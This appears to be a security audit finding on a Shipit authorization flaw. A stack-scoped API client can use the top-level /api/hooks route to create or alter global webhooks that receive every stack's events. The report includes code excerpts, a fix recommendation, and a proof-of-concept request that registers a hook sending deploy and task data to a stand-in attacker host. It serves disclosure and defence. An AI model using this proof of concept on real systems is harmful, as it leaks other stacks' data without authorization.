### Title
API client scoped to one stack can create global hooks that receive deliveries for every stack - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
`Shipit::Api::HooksController` derives the `stack_id` used to scope a `Hook` from the presence of `params[:stack_id]` rather than from the authenticated `ApiClient`'s own stack binding. An `ApiClient` restricted to a single stack (`current_api_client.stack_id`) can call the unscoped route (`/api/hooks`, no `stack_id` param) with its `write:hook`/`read:hook` permission and create, read, update, or destroy **global** hooks (`stack_id: nil`), which receive event deliveries for **every** stack in the installation, not just the one the client is authorized for.

### Finding Description
`BaseController#stacks` restricts the visible stacks to the client's bound stack: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all`. [1](#0-0) 

However, `HooksController` does not use this scoping to determine which hooks a given client can touch. Instead:

```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [2](#0-1) 

`stack_id` only calls `stack` (which enforces the client's stack scope via `stacks.from_param!`) when `params[:stack_id]` is present. The routes expose both a stack-scoped hooks resource and a top-level, stack-agnostic one:
```ruby
scope '/stacks/*stack_id', ... do
  ...
  resources :hooks, only: %i[index create show update destroy]
end

resources :hooks, only: %i[index create show update destroy]
``` [3](#0-2) 

When a client hits the top-level `/api/hooks` route, `params[:stack_id]` is absent, so `stack_id` returns `nil` and `hooks` becomes `Hook.where(stack_id: nil)` — i.e., the set of **global** hooks. `require_permission :write, :hook` / `:read, :hook` only checks that the permission string exists in `current_api_client.permissions` via `ApiClient#check_permissions!`; it never checks that the operation is confined to the client's own `stack_id`. [4](#0-3) 

Global hooks are not cosmetic: `Hook.for_stack` explicitly includes `stack_id: nil` hooks for deliveries triggered by *any* stack:
```ruby
scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }
...
def self.deliver(event, stack_id, payload)
  for_stack(stack_id).listening_event(event).each { |hook| hook.deliver!(event, payload) }
end
``` [5](#0-4) 

The binding that is broken is: **the stack an `ApiClient` token authorizes (`current_api_client.stack_id`) versus the stack(s) whose event data the hook it creates/reads actually touches (all stacks, via `stack_id: nil`)**. A token that is supposed to be confined to one stack's data can plant a webhook receiver that silently gets `task`, `deploy`, `rollback`, `commit_status`, `merge_status`, `pull_request`, etc. payloads for every other stack in the Shipit instance, and can also list/inspect (`index`/`show`) and delete/modify the delivery URLs of those existing global hooks belonging to other, unrelated stacks.

### Impact Explanation
This matches the "High" impact category: unauthenticated (relative to the intended stack scope) read of stack state / task streams / deploy output, since global hook deliveries stream deploy/task/commit-status payloads for stacks the client was never granted access to. It can also be used to redirect or delete global hook delivery configuration used by other stacks (`update`/`destroy` on `Hook.where(stack_id: nil)`), amounting to unauthorized cross-stack write access via a token whose authorization should have been confined to one stack.

### Likelihood Explanation
This requires only an `ApiClient` credential that is stack-scoped and has `read:hook` or `write:hook` in its permission list — a normal, documented, low-privilege configuration (see fixture `here_come_the_walrus`, `stack: shipit`, which can be extended with hook permissions). No special network position, GitHub credentials, or elevated role is needed beyond possessing that one token; the attacker only needs to call the top-level `/api/hooks` endpoint instead of the stack-nested one.

### Recommendation
Scope `Hook` lookups/creation by the authenticated client's own stack binding rather than by the presence of `params[:stack_id]`. For example, derive `stack_id` from `current_api_client.stack_id` when the client is stack-scoped (mirroring `BaseController#stacks`), and reject/ignore the global hooks collection (`stack_id: nil`) for any client whose `stack_id?` is true, regardless of which route was used to reach the controller.

### Proof of Concept
1. Create/obtain an `ApiClient` bound to `stack: shipit` with `permissions: ['write:hook']` (e.g., analogous to fixture `here_come_the_walrus`).
2. Authenticate with this client's Basic Auth token against `POST /api/hooks` (the top-level, non-stack-nested route defined at `config/routes.rb:46`), omitting `stack_id`:
   ```
   POST /api/hooks
   Authorization: Basic <client_id>--<token>
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","task","commit_status"] }
   ```
3. Because `params[:stack_id]` is absent, `HooksController#stack_id` returns `nil`, and `hooks.create(params)` creates a `Hook` with `stack_id: nil` — a global hook.
4. From that point on, every deploy, task, rollback, and commit-status event for **every stack** in the Shipit instance (not just `shipit`) is POSTed to `https://attacker.example.com/collect`, per `Hook.for_stack`/`Hook.deliver`.
5. The same client can also `GET /api/hooks` or `GET /api/hooks/:id` to enumerate/inspect existing global hooks (delivery URLs, secrets metadata) belonging to the whole installation, and `PATCH`/`DELETE` them, despite being authorized only for the `shipit` stack.

      def emit(event, stack, payload)

        end
